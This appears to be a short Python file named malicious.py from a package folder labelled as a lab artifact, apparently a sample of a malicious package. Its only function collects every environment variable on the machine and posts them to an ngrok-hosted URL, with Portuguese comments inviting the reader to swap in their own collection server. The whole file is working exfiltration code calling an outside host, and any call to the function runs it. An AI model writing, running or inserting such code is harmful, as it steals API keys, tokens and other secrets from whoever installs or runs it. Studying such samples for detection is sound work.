# artifact_lab_3_package_2b6a4744/malicious.py
import os
import requests

def exfiltrate_env_vars():
    env_vars = os.environ
    url = "https://a7de-67-205-141-215.ngrok-free.app/log"  # Substitua pelo seu servidor de coleta

    # Enviar as variáveis de ambiente para o servidor
    try:
        requests.post(url, data=env_vars)
    except Exception as e:
        print(f"Failed to exfiltrate environment variables: {e}")

